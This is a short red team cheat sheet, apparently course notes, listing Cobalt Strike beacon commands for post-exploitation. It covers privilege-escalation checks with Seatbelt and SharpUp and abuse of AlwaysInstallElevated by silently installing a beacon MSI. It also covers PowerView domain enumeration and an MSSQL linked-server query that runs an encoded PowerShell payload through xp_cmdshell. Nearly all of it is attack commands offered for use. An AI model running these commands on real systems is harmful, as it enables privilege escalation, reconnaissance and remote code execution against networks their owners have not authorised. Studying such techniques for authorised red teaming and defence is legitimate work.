# RTO CheatSheet

## Persistence

### COM Hijacking

<TODO>
  
## PrivEsc
  
### Seatbelt
  
https://github.com/GhostPack/Seatbelt
  
Sample usage:
  
> beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=system
  
### SharpUp

https://github.com/GhostPack/SharpUp

Sample usage:
  
> beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
> 
> === Modifiable Services ===
> 
>  Name             : Vuln-Service-2
>
>  DisplayName      : Vuln-Service-2
>
>  Description      : 
>
>  State            : Running
>
>  StartMode        : Auto
>
>  PathName         : "C:\Program Files\Vuln Services\Service 2.exe"

Detects:
  - Modifiable Service
  - AlwaysInstallElevated flags in Registry
  
#### Weaponized

##### AlwaysInstallElevated - Install msi package file

> beacon> run msiexec /i BeaconInstaller.msi /q /n
  
## Domain Enumeration
  
### PowerView
  
#### Setup

> beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
  
#### Usages
  
Retrieve Domain information, parameter is optional:
  
> beacon> powershell Get-Domain -Domain <Domain>

Retrieve Domain Controllers and further Domain information:

> beacon> powershell Get-DomainController | select Forest, Name, OSVersion | fl
  
Retrieve Forest information, parameter is optional:
  
> beacon> powershell Get-ForestDomain -Forest [Forest]
  
Get useful information about domain policies like password policies e.g
  
> beacon> powershell Get-DomainPolicyData | select -ExpandProperty SystemAccess
  
Get User information:
  
> beacon> powershell Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | fl
  
## MSSQL
  
> SELECT * FROM OPENQUERY("[targetserver]", 'select @@servername; exec xp_cmdshell ''powershell -enc [EncodedString]''');
